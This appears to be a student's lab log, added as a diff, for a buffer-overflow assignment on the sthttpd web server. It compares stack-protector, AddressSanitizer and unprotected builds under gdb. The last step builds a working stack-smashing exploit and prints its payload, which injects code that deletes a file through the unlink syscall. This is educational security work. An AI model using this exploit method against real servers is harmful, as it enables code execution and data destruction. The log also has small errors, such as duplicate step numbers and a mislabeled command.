@@ -1,0 +1,279 @@
+1. First I opened my remote desktop and updated gcc using the following command:
+
+$ echo PATH=/usr/local/cs/bin:$PATH
+
+This updated my gcc from version 4.2.0 to 7.2.0. I then checked the version
+by using the following command:
+
+$ gcc --version
+
+After updating gcc, I created a folder under my user labeled "Project3".
+
+
+2. I then downloaded sthttpd 2.27.0 and moved it into my Project3 folder. From
+here, I used the following command to unzip the file:
+
+$ tar –xvf sthttpd-2.27.0.tar.gz
+
+After unzipping, I jumped into the newly created directory using the cd command.
+Next, I manually applied the patch by deleting the three lines of code and
+replacing it with the code specified on the assignment page. Next, I had to
+rebuild sthttpd with the new patch. To do this I used the following command:
+
+$ ./configure \
+>   LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+The program is now ready to be compiled. I then created compile.sh within the
+root of sthttpd. This file contained the compilation commands for all three
+(SP-strong stack protection, AS-address sanitization, NO-neither) variants.
+I then used:
+
+$ chmod +777 compile.sh
+
+to make compile.sh executable and ran it with:
+
+$ ./compile.sh
+
+to compile everything at once.
+
+
+3. My next step was to find my port numbers. After using the following equation
+(12330 + 3 * (X % 293) + Y) where X was my UCID and Y was decided on the variant
+of the daemon I was running (SP=1, AS=2, NO=3). I attained the following port
+numbers: SP: 12595; AS: 12596; NO: 12597. I next checked to see if all 3 servers
+were working properly by using the following commands:
+
+$ src/thttpd-sp -p 12595 -D
+$ src/thttpd-as -p 12596 -D
+$ src/thttpd-no -p 12597 -D
+
+Once I ran these I used:
+
+$ ps –u miyahara
+
+to check that they were running. I then killed all 3 using the kill command.
+
+
+4. I then made sure my web servers worked in the normal case by creating a file
+"foo.txt" using the following command:
+
+$ echo 'Everything is working my dudes.' > foo.txt
+
+I then checked that everything was working by using the following curl command:
+
+$ curl http://localhost:xxxxx/foo.txt
+
+once for each variant. (xxxxx represents the corresponding port number) The
+response I recieved was my message (written in foo.txt) three times.
+
+
+5. I created a config.txt file to use enter my arguments to crash the SP
+variant. I used a 500 char string of 'r' which would overflow the allocated
+memory space of 100. I then ran the program using the following command:
+
+$ gdb src/thttpd-sp
+(gdb) run -p 12595 -D -C src/config.txt
+
+this gave me the following response.
+
+** stack smashing detected ***: /w/home.18/ce/ugrad/miyahara/Project3/sthttpd-2.27.0/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7fcfd91 in ?? () from /lib/libgcc_s.so.1
+
+I then ran a backtrace using the following commands:
+
+(gdb) set disassemble-next-line on
+(gdb) bt
+
+this gave me the following.
+
+#0  0xf7fcfd91 in ?? () from /lib/libgcc_s.so.1
+#1  0xf7fd0aa0 in _Unwind_Backtrace () from /lib/libgcc_s.so.1
+#2  0xf7ec4845 in backtrace () from /lib/libc.so.6
+#3  0xf7e25721 in __libc_message () from /lib/libc.so.6
+#4  0xf7ec7d65 in __fortify_fail () from /lib/libc.so.6
+#5  0xf7ec7d1a in __stack_chk_fail () from /lib/libc.so.6
+#6  0x0804c291 in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x72727272 in ?? ()
+#8  0x72727272 in ?? ()
+#9  0x72727272 in ?? ()
+#10 0x72727272 in ?? ()
+#11 0x72727272 in ?? ()
+#12 0x72727272 in ?? ()
+#13 0x72727272 in ?? ()
+#14 0x72727272 in ?? ()
+#15 0x72727272 in ?? ()
+#16 0x72727272 in ?? ()
+#17 0x72727272 in ?? ()
+#18 0x72727272 in ?? ()
+#19 0x72727272 in ?? ()
+#20 0x72727272 in ?? ()
+#21 0x72727272 in ?? ()
+#22 0x72727272 in ?? ()
+
+This makes sense because the letter 'r' is represented by the ascii code 72.
+I then set a breakpoint at line 1190 and use the 'n' command and get the
+following machine code:
+
+0x0804c1da <read_config+1210>:       65 33 05 14 00 00 00    xor    %gs:0x14,%eax
+0x0804c1e1 <read_config+1217>:       0f 85 a5 00 00 00       jne    0x804c28c <read_config+1388>
+
+By using the 'info reg' command, I can tell that the %eax register has been
+corrupted with a value of 0x72727272. With the compile flags we currently have
+up, the machine code runs that against a canary in %gs:0x14. Since these are not
+equal, the jump command is approved. This is what gives us our error. To prepare
+for the next step, I quit gdb and killed the sp program.
+
+
+6. For the AS variant, I used the same config.txt file. I started the AS program
+with the following commands:
+
+$ src/thttpd-as -p 12596 -D
+$ ps -u miyahara
+
+This let me know that the AS variant was working. Next, I used these commands to
+prepare my program in gdb.
+
+$ gdb src/thttpd-as
+(gdb) run -p 12596 -D -C src/config.txt
+
+This gave me the following error:
+
+Starting program: /w/home.18/ce/ugrad/miyahara/Project3/sthttpd-2.27.0/src/thttpd-as -p 12596 -D -C src/config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+=================================================================
+==20584==ERROR: AddressSanitizer: stack-buffer-overflow on address 0xffffbf24 at pc 0x08092736 bp 0xffffbe78 sp 0xffffba50
+READ of size 506 at 0xffffbf24 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7f0cd91 in ?? () from /lib/libgcc_s.so.1
+
+As with the SP variant, I ran a backtrace with the same commands:
+
+(gdb) set disassemble-next-line on
+(gdb) bt
+
+the machine code which crashed the program is the following:
+
+0xf7f0cd91:  66 81 3a 58 b8  cmpw   $0xb858,(%edx)
+
+when the string of 'r' are read in, the string is so long it overflows into
+other registers. By using 'info reg' I could tell this register was overflown.
+The program checks this and sees that the registers have been corrupted and so
+it crashes. I then prepared for step 6 by killing the program.
+
+
+6. I ran the NO variant with the same config.txt file. I started the NO program
+the same way I did the others.
+
+$ src/thttpd-as -p 12596 -D
+$ ps -u miyahara
+
+Again, the ps command was used to make sure the program was running. Next, I
+used the following commands:
+
+$ gdb src/thttpd-no
+(gdb) run -p 12597 -D -C src/config.txt
+
+This gave me the following:
+
+Starting program: /w/home.18/ce/ugrad/miyahara/Project3/sthttpd-2.27.0/src/thttpd-no -p 12597 -D -C src/config.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x72727272 in ?? ()
+
+Note that the address given is the same patter, 72, as the ascii code for 'r'.
+Next I ran through the backtrace with the following commands:
+
+(gdb) set disassemble-next-line on
+(gdb) bt
+
+The instruction causing the crash is below:
+
+0x0804aff7 <read_config+55>:	e8 00 e8 ff ff	call   0x80497fc <fgets@plt>
+
+Without stack protection, the gets function gets overwritten. This corresponds
+with the second patch line.
+
+
+8. To obtain thttpd-sp.s, thttpd-as.s, and thttpd-no.s, I compiled all three of
+the variants using the commands below:
+
+$ gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s
+$ gcc -S -O2 -fno-inline -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s
+$ gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s
+
+I then used the 'ls' command to make sure the .s files were created. Next, I
+observed each of their behavior within the handle_read function. For the sp
+variant, this was at line 2659, as at line 4531, and the no variant at line
+2628. The first thing I noticed when examining all three side by side is both
+the sp and no variant are executed the same way (besides labels). This means
+-fstack-protector-strong does not protect all functions. The as variant is
+completely different. At first observation, it it significantly longer than the
+other two variants. I also noticed it made a buffer by making the stack bigger
+than the other two using the following instruction:
+
+subq	$24, %rsp
+
+It then checks the bounds multiple times throughout the program with the
+following command:
+
+cmpb	$0, 2147450880(%rax)
+jne	.L1180
+
+where %rax is switched in with other registers. This line appears very often
+throughout the assembly code and checks if any registers have been overwritten.
+Each of these lines is followed by a jump which will lead to an error message.
+
+
+9. The first step to this exploit is finding the address of the beginning of
+the buffer. This can be found by running the NO variant and using gdb to go
+through the lines of read_config. This was done using the following commands:
+
+$ src/thttpd-no -p 12597 -D
+$ ps -u miyahara //to check the program is running
+$ gdb src/thttpd-no
+(gdb) set disassemble-next-line on //so we can see the assembly
+(gdb) b read_config //sets a breakpoint at the function we want to observe
+(gdb) run -p 12597 -D -C src/config.txt
+(gdb) si //repeat until I get to a line with a call to fgets
+(gdb) p &line
+
+This gave me the address for the base of the stack at:
+
+$1 = (char (*)[100]) 0xffffc07c
+
+I then used the next command until the read_config function ended. I then used
+the 'info reg' command to look at the address of the stack at the end of the
+function. The address I found was (0xffffc0fc) which is 128 bytes. We then fill
+our config.txt file with 128 characters ('r' in my case). Next, we need to find
+the hex values of "target.txt". This is done with hex2raw. I downloaded it on my
+own machine, then moved it into the sthttpd-2.27.0 folder. I then used the
+following commands:
+
+$ chmod a+x hex2raw //Gives me permission to use it
+& cat input.txt | ./hex2raw > output.txt //Where input.txt had my "target.txt"
+
+After this I had to find the hex for the 'mov' assembly code to put target.txt
+into %rdi making it the first argument when calling our unlink function. I did
+this by making a small function with just that command and compiling it with the
+-S flag. Next, I had to find the address of the unlink function. I did this the
+same way as the 'mov' command by making a small program that called the
+function, compiling it with the -S flag, then looking at the assembly code. The
+important lines have been listed below:
+
+0x00007ffff76c40b0 <+0>:	b8 57 00 00 00	mov    $0x57,%eax //call unlink
+0x00007ffff76c40b5 <+5>:	0f 05	syscall
+
+After taking offsets into account, I put all the hex into input.txt and ran it
+through hex2raw. The output was gibberish, but I then added that to my string of
+'r's. This gave me the following line:
+
+port=rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
+rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr«Ïÿÿÿ  trrget.txt H¿ Ïÿÿÿ  ¸W   
+
+When I ran this under my config.txt, it successfully deleted my target.txt file.
